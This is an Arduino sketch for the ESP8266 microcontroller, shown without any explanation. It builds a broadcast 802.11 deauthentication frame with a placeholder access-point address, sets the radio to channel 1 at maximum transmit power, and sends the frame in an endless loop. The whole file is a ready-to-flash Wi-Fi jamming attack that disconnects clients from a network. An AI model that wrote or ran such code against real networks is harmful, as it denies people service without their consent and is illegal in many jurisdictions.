#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

uint8_t deauthPacket[26] = {
  0xC0, 0x00, // Frame Control: Deauth (Subtype: 12)
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0x00, 0x00,
  0x07, 0x00  // Reason Code: 7 (Class 3 frame received from nonassociated STA)
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(1);
  system_phy_set_max_tpw(82);
  noInterrupts();
  Serial.println("WiFi TX Setup Complete");
}

void loop() {
  int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  if (result != 0) {
    Serial.printf("Failed to send packet. Error: %d\n", result);
  }
}
